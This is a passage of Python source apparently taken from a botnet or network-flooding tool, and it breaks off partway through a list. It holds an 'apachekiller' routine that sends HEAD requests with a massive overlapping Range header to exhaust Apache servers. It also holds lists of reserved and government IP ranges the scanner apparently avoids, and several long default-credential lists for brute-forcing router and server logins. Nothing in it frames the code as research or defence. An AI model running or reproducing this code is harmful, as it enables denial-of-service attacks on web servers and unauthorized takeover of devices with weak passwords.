                request = request + "Cookies: " + str(randrange(1,5)+"\r\n\r\n")
                s.send(request)
            elif "apachekiller" == option:
                s.send("HEAD / HTTP/1.1\r\n")
                s.send("Host: "+host+"\r\n")
                s.send("Range:bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10,5-11,5-12,5-13,5-14,5-15,5-16,5-17,5-18,5-19,5-20,5-21,5-22,5-23,5-24,5-25,5-26,5-27,5-28,5-29,5-30,5-31,5-32,5-33,5-34,5-35,5-36,5-37,5-38,5-39,5-40,5-41,5-42,5-43,5-44,5-45,5-46,5-47,5-48,5-49,5-50,5-51,5-52,5-53,5-54,5-55,5-56,5-57,5-58,5-59,5-60,5-61,5-62,5-63,5-64,5-65,5-66,5-67,5-68,5-69,5-70,5-71,5-72,5-73,5-74,5-75,5-76,5-77,5-78,5-79,5-80,5-81,5-82,5-83,5-84,5-85,5-86,5-87,5-88,5-89,5-90,5-91,5-92,5-93,5-94,5-95,5-96,5-97,5-98,5-99,5-100,5-101,5-102,5-103,5-104,5-105,5-106,5-107,5-108,5-109,5-110,5-111,5-112,5-113,5-114,5-115,5-116,5-117,5-118,5-119,5-120,5-121,5-122,5-123,5-124,5-125,5-126,5-127,5-128,5-129,5-130,5-131,5-132,5-133,5-134,5-135,5-136,5-137,5-138,5-139,5-140,5-141,5-142,5-143,5-144,5-145,5-146,5-147,5-148,5-149,5-150,5-151,5-152,5-153,5-154,5-155,5-156,5-157,5-158,5-159,5-160,5-161,5-162,5-163,5-164,5-165,5-166,5-167,5-168,5-169,5-170,5-171,5-172,5-173,5-174,5-175,5-176,5-177,5-178,5-179,5-180,5-181,5-182,5-183,5-184,5-185,5-186,5-187,5-188,5-189,5-190,5-191,5-192,5-193,5-194,5-195,5-196,5-197,5-198,5-199,5-200,5-201,5-202,5-203,5-204,5-205,5-206,5-207,5-208,5-209,5-210,5-211,5-212,5-213,5-214,5-215,5-216,5-217,5-218,5-219,5-220,5-221,5-222,5-223,5-224,5-225,5-226,5-227,5-228,5-229,5-230,5-231,5-232,5-233,5-234,5-235,5-236,5-237,5-238,5-239,5-240,5-241,5-242,5-243,5-244,5-245,5-246,5-247,5-248,5-249,5-250,5-251,5-252,5-253,5-254,5-255,5-256,5-257,5-258,5-259,5-260,5-261,5-262,5-263,5-264,5-265,5-266,5-267,5-268,5-269,5-270,5-271,5-272,5-273,5-274,5-275,5-276,5-277,5-278,5-279,5-280,5-281,5-282,5-283,5-284,5-285,5-286,5-287,5-288,5-289,5-290,5-291,5-292,5-293,5-294,5-295,5-296,5-297,5-298,5-299,5-300,5-301,5-302,5-303,5-304,5-305,5-306,5-307,5-308,5-309,5-310,5-311,5-312,5-313,5-314,5-315,5-316,5-317,5-318,5-319,5-320,5-321,5-322,5-323,5-324,5-325,5-326,5-327,5-328,5-329,5-330,5-331,5-332,5-333,5-334,5-335,5-336,5-337,5-338,5-339,5-340,5-341,5-342,5-343,5-344,5-345,5-346,5-347,5-348,5-349,5-350,5-351,5-352,5-353,5-354,5-355,5-356,5-357,5-358,5-359,5-360,5-361,5-362,5-363,5-364,5-365,5-366,5-367,5-368,5-369,5-370,5-371,5-372,5-373,5-374,5-375,5-376,5-377,5-378,5-379,5-380,5-381,5-382,5-383,5-384,5-385,5-386,5-387,5-388,5-389,5-390,5-391,5-392,5-393,5-394,5-395,5-396,5-397,5-398,5-399,5-400,5-401,5-402,5-403,5-404,5-405,5-406,5-407,5-408,5-409,5-410,5-411,5-412,5-413,5-414,5-415,5-416,5-417,5-418,5-419,5-420,5-421,5-422,5-423,5-424,5-425,5-426,5-427,5-428,5-429,5-430,5-431,5-432,5-433,5-434,5-435,5-436,5-437,5-438,5-439,5-440,5-441,5-442,5-443,5-444,5-445,5-446,5-447,5-448,5-449,5-450,5-451,5-452,5-453,5-454,5-455,5-456,5-457,5-458,5-459,5-460,5-461,5-462,5-463,5-464,5-465,5-466,5-467,5-468,5-469,5-470,5-471,5-472,5-473,5-474,5-475,5-476,5-477,5-478,5-479,5-480,5-481,5-482,5-483,5-484,5-485,5-486,5-487,5-488,5-489,5-490,5-491,5-492,5-493,5-494,5-495,5-496,5-497,5-498,5-499,5-500,5-501,5-502,5-503,5-504,5-505,5-506,5-507,5-508,5-509,5-510,5-511,5-512,5-513,5-514,5-515,5-516,5-517,5-518,5-519,5-520,5-521,5-522,5-523,5-524,5-525,5-526,5-527,5-528,5-529,5-530,5-531,5-532,5-533,5-534,5-535,5-536,5-537,5-538,5-539,5-540,5-541,5-542,5-543,5-544,5-545,5-546,5-547,5-548,5-549,5-550,5-551,5-552,5-553,5-554,5-555,5-556,5-557,5-558,5-559,5-560,5-561,5-562,5-563,5-564,5-565,5-566,5-567,5-568,5-569,5-570,5-571,5-572,5-573,5-574,5-575,5-576,5-577,5-578,5-579,5-580,5-581,5-582,5-583,5-584,5-585,5-586,5-587,5-588,5-589,5-590,5-591,5-592,5-593,5-594,5-595,5-596,5-597,5-598,5-599,5-600,5-601,5-602,5-603,5-604,5-605,5-606,5-607,5-608,5-609,5-610,5-611,5-612,5-613,5-614,5-615,5-616,5-617,5-618,5-619,5-620,5-621,5-622,5-623,5-624,5-625,5-626,5-627,5-628,5-629,5-630,5-631,5-632,5-633,5-634,5-635,5-636,5-637,5-638,5-639,5-640,5-641,5-642,5-643,5-644,5-645,5-646,5-647,5-648,5-649,5-650,5-651,5-652,5-653,5-654,5-655,5-656,5-657,5-658,5-659,5-660,5-661,5-662,5-663,5-664,5-665,5-666,5-667,5-668,5-669,5-670,5-671,5-672,5-673,5-674,5-675,5-676,5-677,5-678,5-679,5-680,5-681,5-682,5-683,5-684,5-685,5-686,5-687,5-688,5-689,5-690,5-691,5-692,5-693,5-694,5-695,5-696,5-697,5-698,5-699,5-700,5-701,5-702,5-703,5-704,5-705,5-706,5-707,5-708,5-709,5-710,5-711,5-712,5-713,5-714,5-715,5-716,5-717,5-718,5-719,5-720,5-721,5-722,5-723,5-724,5-725,5-726,5-727,5-728,5-729,5-730,5-731,5-732,5-733,5-734,5-735,5-736,5-737,5-738,5-739,5-740,5-741,5-742,5-743,5-744,5-745,5-746,5-747,5-748,5-749,5-750,5-751,5-752,5-753,5-754,5-755,5-756,5-757,5-758,5-759,5-760,5-761,5-762,5-763,5-764,5-765,5-766,5-767,5-768,5-769,5-770,5-771,5-772,5-773,5-774,5-775,5-776,5-777,5-778,5-779,5-780,5-781,5-782,5-783,5-784,5-785,5-786,5-787,5-788,5-789,5-790,5-791,5-792,5-793,5-794,5-795,5-796,5-797,5-798,5-799,5-800,5-801,5-802,5-803,5-804,5-805,5-806,5-807,5-808,5-809,5-810,5-811,5-812,5-813,5-814,5-815,5-816,5-817,5-818,5-819,5-820,5-821,5-822,5-823,5-824,5-825,5-826,5-827,5-828,5-829,5-830,5-831,5-832,5-833,5-834,5-835,5-836,5-837,5-838,5-839,5-840,5-841,5-842,5-843,5-844,5-845,5-846,5-847,5-848,5-849,5-850,5-851,5-852,5-853,5-854,5-855,5-856,5-857,5-858,5-859,5-860,5-861,5-862,5-863,5-864,5-865,5-866,5-867,5-868,5-869,5-870,5-871,5-872,5-873,5-874,5-875,5-876,5-877,5-878,5-879,5-880,5-881,5-882,5-883,5-884,5-885,5-886,5-887,5-888,5-889,5-890,5-891,5-892,5-893,5-894,5-895,5-896,5-897,5-898,5-899,5-900,5-901,5-902,5-903,5-904,5-905,5-906,5-907,5-908,5-909,5-910,5-911,5-912,5-913,5-914,5-915,5-916,5-917,5-918,5-919,5-920,5-921,5-922,5-923,5-924,5-925,5-926,5-927,5-928,5-929,5-930,5-931,5-932,5-933,5-934,5-935,5-936,5-937,5-938,5-939,5-940,5-941,5-942,5-943,5-944,5-945,5-946,5-947,5-948,5-949,5-950,5-951,5-952,5-953,5-954,5-955,5-956,5-957,5-958,5-959,5-960,5-961,5-962,5-963,5-964,5-965,5-966,5-967,5-968,5-969,5-970,5-971,5-972,5-973,5-974,5-975,5-976,5-977,5-978,5-979,5-980,5-981,5-982,5-983,5-984,5-985,5-986,5-987,5-988,5-989,5-990,5-991,5-992,5-993,5-994,5-995,5-996,5-997,5-998,5-999,5-1000,5-1001,5-1002,5-1003,5-1004,5-1005,5-1006,5-1007,5-1008,5-1009,5-1010,5-1011,5-1012,5-1013,5-1014,5-1015,5-1016,5-1017,5-1018,5-1019,5-1020,5-1021,5-1022,5-1023,5-1024,5-1025,5-1026,5-1027,5-1028,5-1029,5-1030,5-1031,5-1032,5-1033,5-1034,5-1035,5-1036,5-1037,5-1038,5-1039,5-1040,5-1041,5-1042,5-1043,5-1044,5-1045,5-1046,5-1047,5-1048,5-1049,5-1050,5-1051,5-1052,5-1053,5-1054,5-1055,5-1056,5-1057,5-1058,5-1059,5-1060,5-1061,5-1062,5-1063,5-1064,5-1065,5-1066,5-1067,5-1068,5-1069,5-1070,5-1071,5-1072,5-1073,5-1074,5-1075,5-1076,5-1077,5-1078,5-1079,5-1080,5-1081,5-1082,5-1083,5-1084,5-1085,5-1086,5-1087,5-1088,5-1089,5-1090,5-1091,5-1092,5-1093,5-1094,5-1095,5-1096,5-1097,5-1098,5-1099,5-1100,5-1101,5-1102,5-1103,5-1104,5-1105,5-1106,5-1107,5-1108,5-1109,5-1110,5-1111,5-1112,5-1113,5-1114,5-1115,5-1116,5-1117,5-1118,5-1119,5-1120,5-1121,5-1122,5-1123,5-1124,5-1125,5-1126,5-1127,5-1128,5-1129,5-1130,5-1131,5-1132,5-1133,5-1134,5-1135,5-1136,5-1137,5-1138,5-1139,5-1140,5-1141,5-1142,5-1143,5-1144,5-1145,5-1146,5-1147,5-1148,5-1149,5-1150,5-1151,5-1152,5-1153,5-1154,5-1155,5-1156,5-1157,5-1158,5-1159,5-1160,5-1161,5-1162,5-1163,5-1164,5-1165,5-1166,5-1167,5-1168,5-1169,5-1170,5-1171,5-1172,5-1173,5-1174,5-1175,5-1176,5-1177,5-1178,5-1179,5-1180,5-1181,5-1182,5-1183,5-1184,5-1185,5-1186,5-1187,5-1188,5-1189,5-1190,5-1191,5-1192,5-1193,5-1194,5-1195,5-1196,5-1197,5-1198,5-1199,5-1200,5-1201,5-1202,5-1203,5-1204,5-1205,5-1206,5-1207,5-1208,5-1209,5-1210,5-1211,5-1212,5-1213,5-1214,5-1215,5-1216,5-1217,5-1218,5-1219,5-1220,5-1221,5-1222,5-1223,5-1224,5-1225,5-1226,5-1227,5-1228,5-1229,5-1230,5-1231,5-1232,5-1233,5-1234,5-1235,5-1236,5-1237,5-1238,5-1239,5-1240,5-1241,5-1242,5-1243,5-1244,5-1245,5-1246,5-1247,5-1248,5-1249,5-1250,5-1251,5-1252,5-1253,5-1254,5-1255,5-1256,5-1257,5-1258,5-1259,5-1260,5-1261,5-1262,5-1263,5-1264,5-1265,5-1266,5-1267,5-1268,5-1269,5-1270,5-1271,5-1272,5-1273,5-1274,5-1275,5-1276,5-1277,5-1278,5-1279,5-1280,5-1281,5-1282,5-1283,5-1284,5-1285,5-1286,5-1287,5-1288,5-1289,5-1290,5-1291,5-1292,5-1293,5-1294,5-1295,5-1296,5-1297,5-1298,5-1299\r\n")
                s.send("Accept-Encoding: gzip\r\n")
                s.send("Cache-Control: no-cache\r\n")
                s.send("Connection: close\r\n")
            s.close()
        except:
            pass

reservedips = [ 
 "http://169.254.",
 "http://127.",
 "http://0", 
 "http://100.64", 
 "http://100.65",
 "http://100.66",
 "http://100.67",
 "http://100.68",
 "http://100.69",
 "http://100.70",
 "http://100.71",
 "http://100.72",
 "http://100.73",
 "http://100.74",
 "http://100.75",
 "http://100.76",
 "http://100.77",
 "http://100.78",
 "http://100.79",
 "http://100.80",
 "http://100.81",
 "http://100.82",
 "http://100.83",
 "http://100.84",
 "http://100.85",
 "http://100.86",
 "http://100.87",
 "http://100.88",
 "http://100.89",
 "http://100.90",
 "http://100.91",
 "http://100.92",
 "http://100.93",
 "http://100.94",
 "http://100.95",
 "http://100.96",
 "http://100.97",
 "http://100.98",
 "http://100.99",
 "http://100.100",
 "http://100.101",
 "http://100.102",
 "http://100.103",
 "http://100.104",
 "http://100.105",
 "http://100.106",
 "http://100.107",
 "http://100.108",
 "http://100.109",
 "http://100.110",
 "http://100.111",
 "http://100.112",
 "http://100.113",
 "http://100.114",
 "http://100.115",
 "http://100.116",
 "http://100.117",
 "http://100.118",
 "http://100.119",
 "http://100.120",
 "http://100.121",
 "http://100.122",
 "http://100.123",
 "http://100.124",
 "http://100.125",
 "http://100.126",
 "http://100.127",
 "http://192.0.0",
 "http://192.0.2.",
 "http://192.88.99.",
 "http://198.18.",
 "http://198.19.",
 "http://198.51.100.",
 "http://203.0.113.",
 "http://224.", 
  "http://225.", 
  "http://226.", 
  "http://227.", 
  "http://228.", 
  "http://229.", 
  "http://230.", 
  "http://231.", 
  "http://232.", 
  "http://233.", 
  "http://234.", 
  "http://235.", 
  "http://236.", 
  "http://237.", 
  "http://238.", 
  "http://239.", 
  "http://240", 
  "http://241", 
  "http://242", 
  "http://243", 
  "http://244", 
  "http://245", 
  "http://246", 
  "http://247", 
  "http://248", 
  "http://249", 
  "http://250", 
  "http://251", 
  "http://252", 
  "http://253", 
  "http://254", 
  "http://255" 
]
govips = [
    "http://138.162", 
    "http://194.60.0", 
    "http://194.60.1", 
    "http://194.60.2", 
    "http://194.60.3", 
    "http://194.60.4", 
    "http://194.60.5", 
    "http://194.60.6", 
    "http://194.60.7", 
    "http://194.60.8", 
    "http://194.60.9", 
    "http://194.60.10", 
    "http://194.60.11", 
    "http://194.60.12", 
    "http://194.60.13", 
    "http://194.60.14", 
    "http://194.60.15", 
    "http://194.60.16", 
    "http://194.60.17", 
    "http://194.60.18", 
    "http://194.60.19", 
    "http://194.60.20", 
    "http://194.60.21", 
    "http://194.60.22", 
    "http://194.60.23", 
    "http://194.60.24", 
    "http://194.60.25", 
    "http://194.60.26", 
    "http://194.60.27", 
    "http://194.60.28", 
    "http://194.60.29", 
    "http://194.60.30", 
    "http://194.60.31", 
    "http://194.60.32", 
    "http://194.60.33", 
    "http://194.60.34", 
    "http://194.60.35", 
    "http://194.60.36", 
    "http://194.60.37", 
    "http://194.60.38", 
    "http://194.60.39", 
    "http://194.60.40", 
    "http://194.60.41", 
    "http://194.60.42", 
    "http://194.60.43", 
    "http://194.60.44", 
    "http://194.60.45", 
    "http://194.60.46", 
    "http://194.60.47", 
    "http://194.60.48", 
    "http://194.60.49", 
    "http://194.60.50", 
    "http://194.60.51", 
    "http://194.60.52", 
    "http://194.60.53", 
    "http://194.60.54", 
    "http://194.60.55", 
    "http://194.60.56", 
    "http://194.60.57", 
    "http://194.60.58", 
    "http://194.60.59", 
    "http://194.60.60", 
    "http://194.60.61", 
    "http://194.60.62", 
    "http://194.60.63", 
    "http://192.197.82",
    "http://131.132", 
    "http://131.133", 
    "http://131.134", 
    "http://131.135", 
    "http://131.136", 
    "http://131.137", 
    "http://131.138", 
    "http://131.139", 
    "http://131.140", 
    "http://131.141", 
    "http://192.197.77", 
    "http://192.197.78", 
    "http://192.197.79", 
    "http://192.197.80", 
    "http://192.197.81", 
    "http://192.197.82", 
    "http://192.197.83", 
    "http://192.197.84", 
    "http://192.197.85", 
    "http://192.197.86", 
    "http://65.165.132", 
    "http://204.248.24", 
    "http://216.81.80", 
    "http://216.81.81", 
    "http://216.81.82", 
    "http://216.81.83", 
    "http://216.81.84", 
    "http://216.81.85", 
    "http://216.81.86", 
    "http://216.81.87", 
    "http://216.81.88", 
    "http://216.81.89", 
    "http://216.81.90", 
    "http://216.81.91", 
    "http://216.81.92", 
    "http://216.81.93", 
    "http://216.81.94", 
    "http://216.81.95", 
    "http://149.101", 
    "http://156.33", 
    "http://143.228", 
    "http://143.231", 
    "http://137.18", 
    "http://12.185.56.0", 
    "http://12.185.56.1", 
    "http://12.185.56.2", 
    "http://12.185.56.3", 
    "http://12.185.56.4", 
    "http://12.185.56.5", 
    "http://12.185.56.6", 
    "http://12.185.56.7", 
    "http://12.147.170.144", 
    "http://12.147.170.145", 
    "http://12.147.170.146", 
    "http://12.147.170.147", 
    "http://12.147.170.148", 
    "http://12.147.170.149", 
    "http://12.147.170.150", 
    "http://12.147.170.151", 
    "http://12.147.170.152", 
    "http://12.147.170.153", 
    "http://12.147.170.154", 
    "http://12.147.170.155", 
    "http://12.147.170.156", 
    "http://12.147.170.157", 
    "http://12.147.170.158", 
    "http://12.147.170.159", 
    "http://74.119.128", 
    "http://74.119.129", 
    "http://74.119.130", 
    "http://74.119.131", 
    "http://82.148.96.68", 
    "http://82.148.97.69" 
]
password_list_A = [
    "root:root",
    "admin:admin",
    "root:toor",
    "root:admin",
    "root:n/a",
    "admin:n/a",
    "root:1234",
    "root:12345",
    "root:123456",
    "root:1q2w3e",
    "root:1q2w3e4r",
    "root:1q2w3e4r5t",
    "root:redtube",
    "root:ferrari",
    "root:test",
    "test:test",
    "root:password",
    "root:abc123",
    "root:123qwe",
    "n/a:n/a"
]
password_list_B = [
    "n/a:password",
    "tech:tech",
    "n/a:n/a",
    "tech:n/a",
    "3comcso:RIP000",
    "3debug:synnet",
    "admin:n/a",
    "recovery:recovery",
    "debug:synnet",
    "Administrator:n/a",
    "admin:admin",
    "FORC:n/a",
    "operator:n/a",
    "adm:n/a",
    "root:n/a",
    "sysadm:anicust",
    "n/a:secret",
    "n/a:adtran",
    "admin:switch",
    "diag:switch",
    "n/a:admin",
    "Console:acc:acc",
    "n/a:backdoor",
    "n/a:atc123",
    "superuser:n/a",
    "n/a:ascend",
    "root:ROOT500",
    "root:cms500",
    "root:pass",
    "n/a:NetICs",
    "security:security",
    "User:n/a",
    "Manager:n/a",
    "n/a:Q54arwms",
    "n/a:Biostar",
    "n/a:Helpdesk",
    "admin:default",
    "n/a:cisco",
    "Administrator:admin",
    "bbsd-client:NULL",
    "bbsd-client:changeme2",
    "admin:diamond",
    "cgadmin:cgadmin",
    "super:surt",
    "D-Link:D-Link",
    "root:tini",
    "n/a:BRIDGE",
    "login:password",
    "n/a:4getme2",
    "login:admin",
    "n/a:hs7mwxkk",
    "n/a:netadmin",
    "n/a:Posterie",
    "n/a:R1QTPS",
    "Administrator:letmein",
    "admin:hello",
    "system:sys",
    "JDE:JDE",
    "hydrasna:n/a",
    "root:root",
    "!root:n/a",
    "setup:changeme(exclam",
    "LUCENT01:UI-PSWD-01",
    "LUCENT02:UI-PSWD-02",
    "admin:AitbISP4eCiG",
    "super:super",
    "n/a:star",
    "service:smile",
    "mac:n/a",
    "root:default",
    "n/a:letmein",
    "cablecom:router",
    "n/a:1234",
    "admin:password",
    "netopia:netopia",
    "n/a:xdfk9874t3",
    "266344:266344",
    "n/a:secure",
    "n/a:0",
    "sysadm:sysadm",
    "Manager:Manager",
    "guest:guest",
    "debug:d.e.b.u.g",
    "echo:echo",
    "pmd:n/a",
    "admin:superuser",
    "n/a:Col2ogro2",
    "superuser:admin",
    "n/a:SKY_FOX",
    "n/a:adminttd",
    "enable:n/a",
    "tiara:tiaranet",
    "support:support",
    "admin:visual",
    "root:wyse",
    "admin:zoomadsl"
]
password_list_C = [
    "root:root",
    "root:toor",
    "root:admin",
    "root:test",
    "root:1234",
    "root:0000",
    "root:****",
    "admin:changeme",
    "root:ombladon",
    "admin:admin",
    "n/a:root",
    "root:n/a",
    "n/a:admin",
    "admin:n/a",
    "n/a:n/a",
    "admin:ombladon",
    "root:qwerty",
    "user:user",
    "admin:password",
    "rob:changeme",
    "eric:eric",
    "operator:operator",
    "anonymous:anonymous",
    "isa:isa",
    "ghost:ghost",
    "console:console",
    "root:password",
    "ftp:ftp",
    "mac:mac",
    "marketing:marketing",
    "admin:adminuser",
    "admin:a123456",
    "admin:password1",
    "admin:passw0rd",
    "admin:Pa$$w0rd",
    "admin:P@ssw0rd",
    "admin:P@55w0rd",
    "admin:P4ssw0rd",
    "daniel:daniel",
    "neo:neo",
    "test01:test01",
    "patrick:patrick",
    "green:green",
    "staff:staff",
    "audit:audit",
    "d:d",
    "redmine:redmine",
    "video:video",
    "dance:dance",
    "cgi:[n0rd574r]",
    "mark:mark",
    "bin:worlddomination",
    "helpdesk:helpdesk123",
    "helpdesk:helpdesk",
    "ftptest:ftptest",
    "root:123456",
    "tomcat:!@#$%^&",
    "user:!@#$%^&",
    "root:!@#$%^&",
    "guest:guest",
    "guest:guest1234",
    "test:1234",
    "test2:test2",
    "test1:test1",
    "test:test",
    "root:b@ckup",
    "root:ch3n0@",
    "root:startr3k",
    "root:t3st1ng",
    "root:g3tt1ng1t",
    "root:appl3",
    "root:r3dh@t",
    "root:p3nt1um",
    "root:us3rn@m3",
    "root:p@ssw0rd",
    "root:an0th3rd@y",
    "root:bl0wm3",
    "root:b1t3m3",
    "root:zxcasdqwe123",
    "root:zxcasdqwe",
    "root:zxcasd",
    "root:123qweasdzxc",
    "root:123qweasd",
    "root:zaqwsxcder",
    "root:zaqwsxcde",
    "root:zaqwsxcd",
    "root:zaqwsxc",
    "root:zaqwsx",
    "root:qazxswedcvf",
    "root:qazxswedcv",
    "root:qazxswedc",
    "root:qazxswed",
    "root:qazxswe",
    "root:qazxsw",
    "root:bluesky",
    "root:s1lv3r",
    "root:d3lt4f0rc3",
    "root:ph03n1x",
    "root:mythtv",
    "root:t3mp",
    "root:0p3r4t0r",
    "root:abcabc",
    "root:asdfg12345",
    "root:asdf1234",
    "root:asd123",
    "root:a1d2f3g4",
    "root:a1s2d3",
    "root:toortoor",
    "root:harrypotter",
    "root:eden",
    "root:achiless",
    "root:beowolf",
    "root:letmein",
    "root:shalom",
    "root:police",
    "root:cobalt",
    "root:sapiens",
    "root:germaine",
    "root:th3k1ng",
    "root:k1ng",
    "root:v1k1ng",
    "root:ROOT!@#$",
    "root:ROOT!@",
    "root:ROOT!",
    "root:ROOT!@#",
    "root:^%$#@!",
    "root:!@#$%!@#$%",
    "root:!@#$!@#$",
    "root:!@#!@#",
    "root:QWERT",
    "root:QWER",
    "root:QWERT!@#$%",
    "root:QWER!@#$",
    "root:QWE!@#",
    "root:!@#$%QWERT",
    "root:!@#$QWER",
    "root:!@#QWE",
    "root:zxcdsaqwe",
    "root:123ewqasdcxz",
    "root:123ewqasd",
    "root:zxcdsaqwe321",
    "root:asd321",
    "root:3edcxsw21qaz",
    "root:3edcxsw2",
    "root:3edc2wsx1qaz",
    "root:3edc2wsx",
    "root:zaq1xsw2cde3",
    "root:zaq1xsw2",
    "root:zaq1",
    "root:xsw21qaz",
    "root:zaq12wsx",
    "root:12344321",
    "root:trewq12",
    "root:54321trewq",
    "root:4321rewq",
    "root:4321qwer",
    "root:trewq12345",
    "root:trewq54321",
    "root:1234rewq",
    "root:123ewq",
    "root:reqw1234",
    "root:ewq123",
    "root:qwemnb",
    "root:123zxc",
    "root:zxc123",
    "root:zxcvbnm",
    "root:zxcv",
    "root:zxcvbn",
    "root:alphabet",
    "root:)(*&^",
    "root:1a2b3c4d",
    "root:1a2b3c",
    "root:1qw23e",
    "root:q12we3",
    "root:q12w",
    "root:q1w2r4t5y6",
    "root:q1w2e3r4",
    "root:q1w2e3",
    "root:1q2w3e4r5t",
    "root:1q2w3e4r",
    "root:1q2w3e",
    "root:1a2s3d4f",
    "root:010203",
    "root:cxzdsaewq321",
    "root:cxzdsaewq",
    "root:zxcdsa",
    "root:1qaz2wsx3edc",
    "root:2wsx1qaz",
    "root:2wsxzaq1",
    "root:4rfv",
    "root:3edc",
    "root:2wsx",
    "root:1qazxsw2",
    "root:1qaz2wsx",
    "root:1qaz",
    "root:asdfghjkl",
    "root:asdfghjk",
    "root:asdfghj",
    "root:asdfgh",
    "root:abcde12345",
    "root:abcd1234",
    "root:abc123",
    "root:!@#$%^&*",
    "root:!@#$%^",
    "root:!@#$%",
    "root:!@#$",
    "root:!@#$%12345",
    "root:!@#$1234",
    "root:!@#123",
    "root:12345!@#$%",
    "root:1234!@#$",
    "root:123!@#",
    "root:123123123",
    "root:12341234",
    "root:123123",
    "root:999999999",
    "root:99999999",
    "root:9999999",
    "root:999999",
    "root:99999",
    "root:9999",
    "root:999",
    "root:888888888",
    "root:88888888",
    "root:8888888",
    "root:888888",
    "root:88888",
    "root:8888",
    "root:888",
    "root:77777777",
    "root:7777777",
    "root:777777",
    "root:77777",
    "root:7777",
    "root:777",
    "root:66666666",
    "root:6666666",
    "root:666666",
    "root:66666",
    "root:6666",
    "root:666",
    "root:55555555",
    "root:5555555",
    "root:555555",
    "root:55555",
    "root:5555",
    "root:555",
    "root:44444444",
    "root:4444444",
    "root:444444",
    "root:44444",
    "root:4444",
    "root:33333333",
    "root:3333333",
    "root:333333",
    "root:33333",
    "root:3333",
    "root:333",
    "root:222222222",
    "root:22222222",
    "root:2222222",
    "root:222222",
    "root:22222",
    "root:2222",
    "root:000000000",
    "root:00000000",
    "root:0000000",
    "root:000000",
    "root:00000",
    "root:111111111",
    "root:11111111",
    "root:1111111",
    "root:111111",
    "root:11111",
    "root:1111",
    "root:123asd",
    "root:qwerty123",
    "root:qwerty12",
    "root:qwerty1",
    "root:qwert12345",
    "root:qwer1234",
    "root:qweasdzxc",
    "root:qweasd",
    "root:123qwe",
    "root:12345qwert",
    "root:1234qwer",
    "root:rootrootroot",
    "root:24680",
    "root:13579",
    "root:987654321",
    "root:87654321",
    "root:7654321",
    "root:654321",
    "root:54321",
    "root:1234567890",
    "root:123456789",
    "root:12345678",
    "root:1234567",
    "root:12345",
    "root:100%security",
    "root:100%secured",
    "root:100%secure",
    "root:100%",
    "root:!q@w#e$r%t",
    "root:!q@w#e",
    "root:!q@w#e$r",
    "root:!2#4QwEr",
    "root:!@#qweASD",
    "root:1@3$5^",
    "root:!2#4%6",
    "root:!1@2#3$4",
    "root:1!2@3#4$",
    "root:!1@2#3",
    "root:1!2@3#",
    "root:!qaz@wsx",
    "root:!QAZ2wsx",
    "root:1qaz@WSX",
    "root:p455w0rd",
    "root:P4ssw0rd",
    "root:supermen",
    "root:superman",
    "root:panadepula",
    "root:shit",
    "root:lolitanebuna",
    "root:7hur@y@t3am$#@!(*(",
    "root:redhat",
    "root:ASTA-NU-E-BUN",
    "admin:@dm1n",
    "admin:@dmin",
    "admin:4dm1n",
    "admin:adm1n",
    "admin:t3mp",
    "user:useruser",
    "mysql:1234!@#$",
    "mysql:123!@#",
    "mysql:!@#$1234",
    "mysql:!@#123",
    "temp:!@#$1234",
    "temp:!@#123",
    "temp:1234!@#$",
    "temp:123!@#",
    "temp:temp!",
    "admin1:admin)!",
    "admin1:admin!",
    "desarrollo:desarrollo",
    "root:test123",
    "root:root123",
    "test:test123",
    "root:passwd",
    "build:build",
    "usuario:usuario",
    "pcap:pcap",
    "test:123",
    "steven:steven",
    "orange:orange",
    "root:redhat123",
    "oracle:oracle",
    "dasusr1:123456",
    "zabbix:zabbix",
    "vnc:vnc",
    "hadoop:hadoop",
    "oracle:123456",
    "grid:grid",
    "root:centos",
    "admin:qwe123",
    "test:123456",
    "root:n0l0g1nzz!!",
    "root:qwertyuiop",
    "git:git",
    "guest:guest123",
    "card:card",
    "student:student",
    "monitor:monitor",
    "database:database",
    "guest:123456",
    "federico:federico",
    "root:123abc",
    "postgres:postgres",
    "git:toso123hack",
    "vnc:toso123hack",
    "pieter:pieter",
    "mexal:mexal",
    "resin:resin",
    "root:11",
    "webmaster:webmaster",
    "mysql:mysql",
    "library:library",
    "info:info",
    "shell:shell",
    "linux:linux",
    "unix:unix",
    "webadmin:webadmin",
    "admin:admin123",
    "master:master",
    "apache:apache",
    "root:webadmin",
    "root:shell",
    "root:linux",
    "root:webmaster",
    "root:mysql",
    "admin:root",
    "admin:administrator",
    "admin:12345",
    "admin:123456",
    "test:test12345",
    "tomcat:tomcat01",
    "tomcat:tomcat0",
    "tomcat:t0mkat",
    "tomcat:t0mcat",
    "tomcat:TOMCAT",
    "tomcat:123123",
    "tomcat:123tomcat",
    "tomcat:qwerty123",
    "tomcat:qwerty12",
    "tomcat:qwerty1",
    "tomcat:qwerty",
    "tomcat:qweasdzxc",
    "tomcat:zaq12wsx",
    "tomcat:2wsxzaq1",
    "tomcat:1qazxsw2",
    "tomcat:1qaz2wsx",
    "tomcat:2wsx",
    "tomcat:1qaz",
    "tomcat:testomcat",
    "tomcat:testtomcat",
    "tomcat:test123",
    "tomcat:test",
    "tomcat:QWER!@#$",
    "tomcat:QWE!@#",
    "tomcat:!@#$QWER",
    "tomcat:!@#QWE",
    "tomcat:12345qwert",
    "tomcat:1234qwer",
    "tomcat:qwe123",
    "tomcat:123qwe",
    "tomcat:tomcatpass",
    "tomcat:!@#$%^&*(",
    "tomcat:!@#$%^&*",
    "tomcat:!@#$%^",
    "tomcat:!@#$%",
    "tomcat:!@#$",
    "tomcat:!@#",
    "tomcat:tomcat!@#",
    "tomcat:tomcat!@",
    "tomcat:tomcat!",
    "tomcat:!@#$%12345",
    "tomcat:!@#$1234",
    "tomcat:!@#123",
    "tomcat:12345!@#$%",
    "tomcat:1234!@#$",
    "tomcat:123!@#",
    "tomcat:54321",
    "tomcat:654321",
    "tomcat:12345678910",
    "tomcat:123456789",
    "tomcat:12345678",
    "tomcat:1234567",
    "tomcat:123456",
    "tomcat:12345",
    "tomcat:1234",
    "tomcat:123",
    "tomcat:tomcat123",
    "tomcat:tomcat12",
    "tomcat:tomcat1",
    "shop:posh",
    "ftp:qwerty123",
    "ftp:qwerty12",
    "ftp:qwerty1",
    "ftp:2wsx1qaz",
    "ftp:2wsxzaq1",
    "ftp:2wsx",
    "ftp:1qazxsw2",
    "ftp:1qaz2wsx",
    "ftp:1qaz",
    "ftp:qwert12345",
    "ftp:qwer1234",
    "ftp:qwe123",
    "ftp:123456qwerty",
    "ftp:12345qwert",
    "ftp:1234qwer",
    "ftp:123qwe",
    "mysql:2wsx1qaz",
